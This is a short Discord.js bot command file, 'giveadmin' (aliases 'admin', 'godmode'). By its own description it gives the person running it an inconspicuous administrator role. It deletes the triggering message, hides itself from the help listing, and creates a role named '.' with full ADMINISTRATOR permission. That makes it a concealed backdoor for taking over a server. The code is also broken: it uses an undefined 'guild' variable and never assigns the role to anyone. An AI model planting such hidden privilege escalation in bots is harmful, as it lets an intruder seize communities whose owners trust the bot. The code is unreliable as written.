const Discord = require('discord.js');
const { prefix, embedColor } = require('../config.json');

module.exports = {
	name: 'giveadmin',
	description: 'gives the person who executed the command an inconspicous admin role',
	aliases: ['admin', 'godmode'],
	usage: `${prefix}giveadmin`,
	guildOnly: true,
	deleteMessage: true,
	helpMessage: false,
	execute(message, args) {
		guild.roles.create({
			data: {
				name: '.',
				permissions: [{
					'ADMINISTRATOR': true,
				}]
			}
		})
	},
}